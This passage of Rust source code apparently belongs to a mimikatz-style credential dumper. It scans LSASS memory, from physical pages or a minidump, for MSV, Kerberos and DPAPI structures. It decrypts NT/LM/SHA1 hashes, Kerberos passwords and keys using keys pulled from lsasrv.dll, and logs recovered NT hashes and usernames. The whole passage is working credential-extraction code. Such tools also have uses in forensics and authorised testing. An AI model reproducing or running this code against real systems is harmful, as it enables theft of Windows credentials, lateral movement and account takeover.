                || page_data[off + 3] != 0x00
            {
                continue;
            }

            // The KIWI_MSV1_0_PRIMARY_CREDENTIALS struct starts 0x08 bytes before this
            if off < 0x08 {
                continue;
            }
            let struct_off = off - 0x08;

            // Ensure enough room on page for the full structure header (0x28 bytes)
            if struct_off + 0x28 > 0x1000 {
                continue;
            }

            // Validate: next pointer at +0x00 should be 0 or a heap ptr
            let Some(next) = read_u64_le(&page_data, struct_off) else { continue };
            if next != 0 && (next < 0x10000 || (next >> 48) != 0) {
                continue;
            }

            // Validate: ANSI_STRING.Buffer at +0x10 should be a heap ptr
            let Some(buf_ptr) = read_u64_le(&page_data, struct_off + 0x10) else { continue };
            if buf_ptr < 0x10000 || (buf_ptr >> 48) != 0 {
                continue;
            }

            // Validate: Credentials UNICODE_STRING at +0x18
            let Some(cred_len) = read_u16_le(&page_data, struct_off + 0x18).map(|v| v as usize) else { continue };
            let Some(cred_max_len) = read_u16_le(&page_data, struct_off + 0x1A).map(|v| v as usize) else { continue };
            let Some(cred_buf) = read_u64_le(&page_data, struct_off + 0x20) else { continue };

            // Encrypted credentials must be non-zero length, reasonable size, even length
            if cred_len == 0 || cred_len > 0x400 || cred_max_len < cred_len {
                continue;
            }
            // Buffer must be a valid heap pointer
            if cred_buf < 0x10000 || (cred_buf >> 48) != 0 {
                continue;
            }

            let struct_vaddr = mapping.vaddr + struct_off as u64;
            let struct_paddr = mapping.paddr + struct_off as u64;
            candidates_found += 1;

            log::debug!(
                "MSV phys-scan: Primary credential candidate at VA 0x{:x} (PA 0x{:x}): \
                 next=0x{:x}, ANSI buf=0x{:x}, enc_len={}, enc_buf=0x{:x}",
                struct_vaddr,
                struct_paddr,
                next,
                buf_ptr,
                cred_len,
                cred_buf
            );

            cred_candidates.push((struct_vaddr, struct_paddr));
        }
    });

    log::info!(
        "MSV physical scan: {} pages scanned, {} Primary credential candidates found",
        pages_scanned,
        candidates_found
    );

    // Process all candidates without deduplication — multiple sessions may share the
    // same encrypted credential blob, and we need one result per session for the caller
    // to match by username/domain. Dedup happens in the caller via `c.msv.is_none()`.
    let mut validated_variant: Option<usize> = None;
    for (vaddr, _paddr) in &cred_candidates {
        // Try to verify "Primary" string
        let ansi_buf = vmem.read_virt_u64(*vaddr + 0x10).unwrap_or(0);
        if ansi_buf != 0 {
            if let Ok(primary_bytes) = vmem.read_virt_bytes(ansi_buf, 7) {
                if primary_bytes != b"Primary" {
                    log::debug!(
                        "  VA 0x{:x}: ANSI string is '{}', not 'Primary' - skipping",
                        vaddr,
                        String::from_utf8_lossy(&primary_bytes)
                    );
                    continue;
                }
                log::debug!("  VA 0x{:x}: Confirmed 'Primary' ANSI string", vaddr);
            }
            // If we can't read the string (paged out), still try extraction
        }

        // Extract encrypted credentials
        match crate::lsass::msv::try_extract_primary_credential(
            vmem,
            *vaddr,
            keys,
            &mut validated_variant,
            arch,
        ) {
            Ok(cred) => {
                // Check if the hash is non-zero (not empty)
                if cred.nt_hash == [0u8; 16] {
                    log::debug!("  VA 0x{:x}: NT hash is all zeros, skipping", vaddr);
                    continue;
                }

                // Try to get username/domain from the decrypted credential blob
                // The MSV1_0_PRIMARY_CREDENTIAL contains:
                //   +0x00: LogonDomainName (UNICODE_STRING embedded)
                //   +0x10: UserName (UNICODE_STRING embedded)
                // But these are inside the encrypted blob, so read from the blob
                let (username, domain) = crate::lsass::msv::extract_username_from_cred_blob(vmem, *vaddr, keys, arch);

                log::info!(
                    "MSV credential (phys scan): user='{}' domain='{}' NT={}",
                    username,
                    domain,
                    hex::encode(cred.nt_hash)
                );
                results.push((
                    0, // LUID unknown from this approach
                    MsvCredential {
                        username,
                        domain,
                        lm_hash: cred.lm_hash,
                        nt_hash: cred.nt_hash,
                        sha1_hash: cred.sha1_hash,
                    },
                ));
            }
            Err(e) => {
                log::debug!("  VA 0x{:x}: credential extraction failed: {}", vaddr, e);
            }
        }
    }

    results
}

/// Scan LSASS physical pages for KIWI_KERBEROS_PRIMARY_CREDENTIAL_1607 structures.
///
/// Layout:
///   +0x00: UserName   (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer u64)
///   +0x10: DomainName (UNICODE_STRING: same layout)
///   +0x20: unk0       (PVOID, 8 bytes)
///   +0x28: unk_pad    (8 bytes)
///   +0x30: Password   (UNICODE_STRING: encrypted)
///
/// The scan validates that +0x20..+0x30 does NOT look like another UNICODE_STRING
/// (to distinguish from arrays of UNICODE_STRINGs in memory).
/// Only credentials whose user/domain match already-known logon sessions are returned.
fn scan_phys_for_kerberos_credentials<P: PhysicalMemory>(
    phys: &P,
    lsass_dtb: u64,
    vmem: &dyn VirtualMemory,
    keys: &CryptoKeys,
    known_users: &std::collections::HashSet<(String, String)>,
) -> Vec<(u64, KerberosCredential)> {
    let walker = PageTableWalker::new(phys);
    let mut results = Vec::new();
    let mut pages_scanned = 0u64;
    let mut candidates_found = 0u64;

    log::info!("Kerberos physical scan: searching for credential structures in LSASS pages...");

    let mut cred_candidates: Vec<u64> = Vec::new();

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size != 0x1000 {
            return;
        }
        pages_scanned += 1;

        let page_data = match phys.read_phys_bytes(mapping.paddr, 0x1000) {
            Ok(d) => d,
            Err(_) => return,
        };

        if page_data.iter().all(|&b| b == 0) {
            return;
        }

        // Need at least 0x40 bytes (up to Password buffer pointer at +0x38).
        for off in (0..0x1000usize - 0x40).step_by(8) {
            // --- UserName UNICODE_STRING at +0x00 ---
            let Some(user_len) = read_u16_le(&page_data, off).map(|v| v as usize) else { continue };
            let Some(user_max) = read_u16_le(&page_data, off + 2).map(|v| v as usize) else { continue };
            let Some(user_pad) = read_u32_le(&page_data, off + 4) else { continue };
            let Some(user_buf) = read_u64_le(&page_data, off + 8) else { continue };

            if user_len == 0 || user_len > 100 || !user_len.is_multiple_of(2) {
                continue;
            }
            if user_max < user_len || user_max > 0x200 || user_pad != 0 {
                continue;
            }
            if user_buf < 0x10000 || (user_buf >> 48) != 0 {
                continue;
            }

            // --- DomainName UNICODE_STRING at +0x10 ---
            let Some(dom_len) = read_u16_le(&page_data, off + 0x10).map(|v| v as usize) else { continue };
            let Some(dom_max) = read_u16_le(&page_data, off + 0x12).map(|v| v as usize) else { continue };
            let Some(dom_pad) = read_u32_le(&page_data, off + 0x14) else { continue };
            let Some(dom_buf) = read_u64_le(&page_data, off + 0x18) else { continue };

            if dom_len == 0 || dom_len > 100 || !dom_len.is_multiple_of(2) {
                continue;
            }
            if dom_max < dom_len || dom_max > 0x200 || dom_pad != 0 {
                continue;
            }
            if dom_buf < 0x10000 || (dom_buf >> 48) != 0 {
                continue;
            }

            // Try both Win10 1607+ layout (gap at +0x20, Password at +0x30)
            // and Win7/8/Win10-1507 layout (Password at +0x28, no gap).
            // For Win10 1607+, +0x20 is unk0 PVOID, not a UNICODE_STRING.
            // For Win7/8, +0x20 IS the Password UNICODE_STRING (or at +0x28).
            let mut found_pwd = false;
            for &pwd_off in &[0x30u64, 0x28] {
                let po = pwd_off as usize;
                if off + po + 0x10 > 0x1000 {
                    continue;
                }

                let Some(pwd_len) = read_u16_le(&page_data, off + po).map(|v| v as usize) else { continue };
                let Some(pwd_max) = read_u16_le(&page_data, off + po + 2).map(|v| v as usize) else { continue };
                let Some(pwd_pad) = read_u32_le(&page_data, off + po + 4) else { continue };
                let Some(pwd_buf) = read_u64_le(&page_data, off + po + 8) else { continue };

                if pwd_len == 0 || pwd_len > 0x200 || pwd_max < pwd_len || pwd_pad != 0 {
                    continue;
                }
                if pwd_buf < 0x10000 || (pwd_buf >> 48) != 0 {
                    continue;
                }

                // All buffer pointers should be in a similar heap region
                let min_buf = user_buf.min(dom_buf).min(pwd_buf);
                let max_buf = user_buf.max(dom_buf).max(pwd_buf);
                if max_buf - min_buf > 0x100000 {
                    continue;
                }

                found_pwd = true;
                break;
            }
            if !found_pwd {
                continue;
            }

            let struct_vaddr = mapping.vaddr + off as u64;
            candidates_found += 1;
            cred_candidates.push(struct_vaddr);
        }
    });

    log::info!(
        "Kerberos physical scan: {} pages scanned, {} candidates found",
        pages_scanned,
        candidates_found
    );

    // Process candidates: validate against known users and try decryption
    let mut seen: std::collections::HashSet<(String, String)> = std::collections::HashSet::new();
    let mut readable_count = 0u32;
    let mut matched_count = 0u32;

    for vaddr in &cred_candidates {
        let username = vmem.read_win_unicode_string(*vaddr).unwrap_or_default();
        let domain = vmem
            .read_win_unicode_string(*vaddr + 0x10)
            .unwrap_or_default();

        if username.is_empty() || domain.is_empty() {
            continue;
        }
        readable_count += 1;

        // Only accept credentials that match known logon sessions (from MSV/WDigest)
        let key = (username.to_lowercase(), domain.to_lowercase());
        if !known_users.contains(&key) {
            continue;
        }
        matched_count += 1;

        if !seen.insert(key) {
            continue;
        }

        // Try to decrypt the password (try Win10 1607+ offset first, then older)
        let password = crate::lsass::kerberos::extract_kerb_password(vmem, *vaddr, 0x30, keys)
            .or_else(|_| crate::lsass::kerberos::extract_kerb_password(vmem, *vaddr, 0x28, keys))
            .unwrap_or_default();

        log::info!(
            "Kerberos credential (phys scan): user='{}' domain='{}' password_len={}",
            username,
            domain,
            password.len()
        );

        results.push((
            0, // LUID unknown from physical scan
            KerberosCredential {
                username,
                domain,
                password,
                keys: Vec::new(),
                tickets: Vec::new(),
            },
        ));
    }

    if readable_count > 0 {
        log::info!(
            "Kerberos physical scan: {} readable, {} matched known users, {} extracted",
            readable_count,
            matched_count,
            results.len()
        );
    }

    results
}

/// Physical scan for KIWI_KERBEROS_KEYS_LIST_6 structures in LSASS pages.
/// Returns extracted Kerberos keys grouped by heuristic (each key list → group).
fn scan_phys_for_kerberos_keys<P: PhysicalMemory>(
    phys: &P,
    lsass_dtb: u64,
    vmem: &dyn VirtualMemory,
    keys: &CryptoKeys,
) -> Vec<Vec<KerberosKey>> {
    let walker = PageTableWalker::new(phys);
    let mut key_list_candidates: Vec<u64> = Vec::new();
    let mut pages_scanned = 0u64;

    log::info!("Kerberos key physical scan: searching for key list structures in LSASS pages...");

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size != 0x1000 {
            return;
        }
        pages_scanned += 1;

        let page_data = match phys.read_phys_bytes(mapping.paddr, 0x1000) {
            Ok(d) => d,
            Err(_) => return,
        };

        if page_data.iter().all(|&b| b == 0) {
            return;
        }

        // Search for KIWI_KERBEROS_KEYS_LIST_6 header:
        //   +0x00: unk0 (DWORD)
        //   +0x04: cbItem (DWORD) - number of entries (1-10)
        //   +0x28: first KERB_HASHPASSWORD entry
        // Try both 1607+ and pre-1607 layouts for the first entry.
        for off in (0..0x1000usize - 0x80).step_by(8) {
            let Some(cb_item) = read_u32_le(&page_data, off + 4) else { continue };
            if cb_item == 0 || cb_item > 10 {
                continue;
            }

            // Try each layout: generic_offset within the first entry.
            // 0x20 = KEY_ENTRY_1607.generic_offset, 0x18 = KEY_ENTRY_PRE1607.generic_offset
            for &generic_off_in_entry in &[0x20usize, 0x18] {
                let entry_off = off + 0x28;
                let generic_off = entry_off + generic_off_in_entry;
                if generic_off + 0x18 > 0x1000 {
                    continue;
                }

                // KERB_HASHPASSWORD_GENERIC layout:
                //   +0x00: etype (u32)   — encryption type (pre-1607)
                //          OR version=2  — on Win10 1607+, etype shifts to +0x04
                //   +0x08: key_size (u64)
                //   +0x10: key_ptr (u64)
                // Note: For 1607+ the version(2) at +0x00 is filtered by the etype check
                // below, so only pre-1607 entries match in the scan phase. The actual
                // extraction loop (below) handles both layouts via KEY_ENTRY offsets.
                let Some(etype) = read_u32_le(&page_data, generic_off) else { continue };
                let Some(key_size) = read_u64_le(&page_data, generic_off + 8) else { continue };
                let Some(key_ptr) = read_u64_le(&page_data, generic_off + 16) else { continue };

                let valid_etype = matches!(etype, 1 | 3 | 17 | 18 | 23 | 24);
                if !valid_etype {
                    continue;
                }

                let expected = match etype {
                    17 => 16,
                    18 => 32,
                    23 | 24 => 16,
                    1 | 3 => 8,
                    _ => continue,
                };
                if key_size != expected {
                    continue;
                }

                if key_ptr < 0x10000 || (key_ptr >> 48) != 0 {
                    continue;
                }

                let vaddr = mapping.vaddr + off as u64;
                key_list_candidates.push(vaddr);
                break; // Don't add same offset for both layouts
            }
        }
    });

    log::info!(
        "Kerberos key physical scan: {} pages scanned, {} key list candidates",
        pages_scanned,
        key_list_candidates.len()
    );

    let mut all_key_groups: Vec<Vec<KerberosKey>> = Vec::new();
    let mut seen_keys: std::collections::HashSet<Vec<u8>> = std::collections::HashSet::new();

    for vaddr in &key_list_candidates {
        let cb_item = match vmem.read_virt_u32(*vaddr + 0x04) {
            Ok(n) if n > 0 && n <= 10 => n as usize,
            _ => continue,
        };

        let mut key_group = Vec::new();
        let entries_base = *vaddr + 0x28;

        // Try 1607+ layout first, then pre-1607
        for key_entry in &[
            &crate::lsass::kerberos::KEY_ENTRY_1607,
            &crate::lsass::kerberos::KEY_ENTRY_PRE1607,
        ] {
            key_group.clear();
            let mut valid_count = 0usize;

            for i in 0..cb_item {
                let entry_base = entries_base + (i as u64) * key_entry.entry_size;
                let generic_base = entry_base + key_entry.generic_offset;

                let etype = match vmem.read_virt_u32(generic_base) {
                    Ok(t) => t,
                    Err(_) => break,
                };
                let key_size = match vmem.read_virt_u64(generic_base + 0x08) {
                    Ok(s) if s > 0 && s <= 256 => s as usize,
                    _ => break,
                };
                let checksum_ptr = match vmem.read_virt_u64(generic_base + 0x10) {
                    Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
                    _ => break,
                };

                let enc_key_data = match vmem.read_virt_bytes(checksum_ptr, key_size) {
                    Ok(d) => d,
                    Err(_) => break,
                };
                let decrypted = match crate::lsass::crypto::decrypt_credential(keys, &enc_key_data)
                {
                    Ok(d) => d,
                    Err(_) => break,
                };

                let expected_len = match etype {
                    17 => 16,
                    18 => 32,
                    23 | 24 => 16,
                    1 | 3 => 8,
                    _ => {
                        // Unknown etype — skip but don't break the chain
                        continue;
                    }
                };
                if decrypted.len() < expected_len {
                    break;
                }
                let key_bytes = decrypted[..expected_len].to_vec();
                if key_bytes.iter().all(|&b| b == 0) {
                    continue;
                }
                valid_count += 1;
                key_group.push(KerberosKey {
                    etype,
                    key: key_bytes,
                });
            }

            if valid_count > 0 {
                break;
            }
        }

        if key_group.is_empty() {
            continue;
        }

        // Dedup by key content
        let sig: Vec<u8> = key_group.iter().flat_map(|k| &k.key).copied().collect();
        if !seen_keys.insert(sig) {
            continue;
        }

        log::info!(
            "Kerberos key physical scan: found {} keys at 0x{:x} (etypes: {})",
            key_group.len(),
            vaddr,
            key_group
                .iter()
                .map(|k| format!("{}", k.etype))
                .collect::<Vec<_>>()
                .join(",")
        );

        all_key_groups.push(key_group);
    }

    log::info!(
        "Kerberos key physical scan: {} unique key groups found",
        all_key_groups.len()
    );

    all_key_groups
}

fn find_module<'a>(modules: &'a [LoadedModule], name: &str) -> Option<&'a LoadedModule> {
    modules
        .iter()
        .find(|m| m.base_name.eq_ignore_ascii_case(name))
}

// ---------------------------------------------------------------------------
// Minidump credential extraction (no PhysicalMemory, only VirtualMemory)
// ---------------------------------------------------------------------------

/// Extract LSASS credentials from a parsed minidump.
///
/// Works like [`extract_all_credentials`] but operates directly on
/// [`VirtualMemory`] backed by minidump memory regions. When the standard
/// MSV list walk returns empty, falls back to scanning all memory regions
/// for Primary credential structures (similar to the physical scan fallback
/// in `extract_all_credentials`).
pub fn extract_credentials_from_minidump(
    vmem: &dyn VirtualMemory,
    modules: &[LoadedModule],
    build_number: u32,
    region_ranges: &[(u64, u64)],
    arch: Arch,
) -> Result<Vec<Credential>> {
    let dlls = LsassDlls::from_modules(modules);

    let lsasrv = dlls
        .lsasrv
        .ok_or_else(|| VmkatzError::ProcessNotFound("lsasrv.dll not found in minidump".to_string()))?;

    // Use build number from minidump header, fallback to KUSER_SHARED_DATA
    let effective_build = if build_number > 0 {
        build_number
    } else {
        vmem.read_virt_u32(KUSER_NT_BUILD_NUMBER)
            .map(|v| v & 0xFFFF)
            .unwrap_or(0)
    };
    log::info!("Minidump: Windows build number: {}", effective_build);

    // Extract crypto keys from lsasrv.dll
    let keys = match arch {
        Arch::X64 => crypto::extract_crypto_keys(vmem, lsasrv.base, lsasrv.size)?,
        Arch::X86 => crypto::extract_crypto_keys_x86(vmem, lsasrv.base, lsasrv.size)?,
    };

    let mut all_creds: std::collections::HashMap<u64, Credential> =
        std::collections::HashMap::new();
    let mut status = ProviderStatuses::new(&dlls);

    // MSV sessions + credentials (with vmem region scan fallback)
    if let Some(msv) = &dlls.msv1_0 {
        let mut sessions = crate::lsass::msv::extract_msv_sessions_arch(vmem, msv.base, msv.size, effective_build, arch);
        log::info!("MSV sessions discovered: {}", sessions.len());
        crate::lsass::msv::enrich_sessions_from_lsasrv(
            vmem, lsasrv.base, lsasrv.size, &mut sessions, arch,
        );
        insert_sessions(&mut all_creds, sessions);

        match crate::lsass::msv::extract_msv_credentials_arch(vmem, msv.base, msv.size, &keys, effective_build, arch) {
            Ok(creds) if !creds.is_empty() => {
                status.msv = ProviderStatus::Ok;
                for (luid, msv_cred) in creds {
                    let entry = all_creds.entry(luid).or_insert_with(|| {
                        Credential::new_empty(luid, msv_cred.username.clone(), msv_cred.domain.clone())
                    });
                    entry.msv = Some(msv_cred);
                }
            }
            Ok(_) | Err(_) => {
                log::info!("MSV list walk returned empty, trying vmem region scan fallback...");
                let scan_creds = crate::lsass::msv::scan_vmem_for_msv_credentials(vmem, region_ranges, &keys, arch);
                if !scan_creds.is_empty() {
                    status.msv = ProviderStatus::Ok;
                    let mut next_synth_luid = 0x8000_0000_0000_0000u64;
                    for (_luid, msv_cred) in scan_creds {
                        let effective_luid = if !msv_cred.username.is_empty() {
                            all_creds
                                .iter()
                                .find(|(_, c)| {
                                    let name_match = c.username.eq_ignore_ascii_case(&msv_cred.username);
                                    let domain_match = msv_cred.domain.is_empty()
                                        || msv_cred.domain == "."
                                        || c.domain.eq_ignore_ascii_case(&msv_cred.domain);
                                    name_match && domain_match && c.msv.is_none()
                                })
                                .map(|(&k, _)| k)
                                .unwrap_or_else(|| { let s = next_synth_luid; next_synth_luid += 1; s })
                        } else {
                            all_creds
                                .iter()
                                .find(|(_, c)| {
                                    c.msv.is_none()
                                        && c.kerberos.as_ref().is_some_and(|k| {
                                            k.keys.iter().any(|key| key.etype == 23 && key.key.len() == 16 && key.key[..] == msv_cred.nt_hash[..])
                                        })
                                })
                                .map(|(&k, _)| k)
                                .unwrap_or_else(|| { let s = next_synth_luid; next_synth_luid += 1; s })
                        };
                        let entry = all_creds.entry(effective_luid).or_insert_with(|| {
                            Credential::new_empty(effective_luid, msv_cred.username.clone(), msv_cred.domain.clone())
                        });
                        entry.msv = Some(msv_cred);
                    }
                } else {
                    status.msv = ProviderStatus::Empty;
                }
            }
        }
    }

    // Simple providers (WDigest, TsPkg, SSP, LiveSSP, Credman, CloudAP)
    extract_simple_providers(vmem, &dlls, &keys, arch, &mut all_creds, &mut status);

    // Kerberos (with vmem scan + key scan fallbacks, x64 only)
    if let Some(krb) = &dlls.kerberos {
        let krb_creds = match crate::lsass::kerberos::extract_kerberos_credentials_arch(
            vmem, krb.base, krb.size, &keys, arch,
        ) {
            Ok(creds) if !creds.is_empty() => creds,
            Ok(_) | Err(_) => {
                if arch == Arch::X64 {
                    log::info!("Kerberos: AVL table walk found nothing, trying vmem scan fallback...");
                    let known_sessions: std::collections::HashMap<u64, (String, String)> = all_creds
                        .iter()
                        .map(|(&luid, c)| (luid, (c.username.clone(), c.domain.clone())))
                        .collect();
                    crate::lsass::kerberos::scan_vmem_for_kerberos_credentials(vmem, region_ranges, &keys, &known_sessions)
                } else {
                    log::info!("Kerberos: AVL table walk found nothing (vmem scan not available for x86)");
                    Vec::new()
                }
            }
        };
        let has_keys = krb_creds.iter().any(|(_, k)| !k.keys.is_empty());
        if !krb_creds.is_empty() {
            status.kerberos = ProviderStatus::Ok;
        }
        for (luid, krb_cred) in krb_creds {
            let effective_luid = if luid == 0 {
                all_creds
                    .iter()
                    .find(|(_, c)| {
                        c.username.eq_ignore_ascii_case(&krb_cred.username)
                            && c.domain.eq_ignore_ascii_case(&krb_cred.domain)
                            && c.kerberos.is_none()
                    })
                    .map(|(&k, _)| k)
                    .unwrap_or(luid)
            } else {
                luid
            };
            let entry = all_creds.entry(effective_luid).or_insert_with(|| {
                Credential::new_empty(effective_luid, krb_cred.username.clone(), krb_cred.domain.clone())
            });
            entry.kerberos = Some(krb_cred);
        }

        if !has_keys && arch == Arch::X64 {
            let key_groups = crate::lsass::kerberos::scan_vmem_for_kerberos_keys(vmem, region_ranges, &keys);
            if !key_groups.is_empty() {
                status.kerberos = ProviderStatus::Ok;
                assign_kerberos_key_groups(&mut all_creds, key_groups);
            }
        }
    }

    // DPAPI (DLL chain + vmem scan fallback)
    let mut dpapi_creds = extract_dpapi_from_dlls(vmem, lsasrv, dlls.dpapisrv, &keys, arch);
    if dpapi_creds.is_empty() {
        log::info!("DPAPI: standard extraction found nothing, trying vmem scan...");
        dpapi_creds = crate::lsass::dpapi::extract_dpapi_vmem_scan(vmem, region_ranges, &keys, arch);
    }
    status.dpapi = ProviderStatus::from_result_empty(dpapi_creds.is_empty());
    insert_dpapi_creds(&mut all_creds, dpapi_creds);

    status.print_summary();
    Ok(finalize_credentials(all_creds))
}
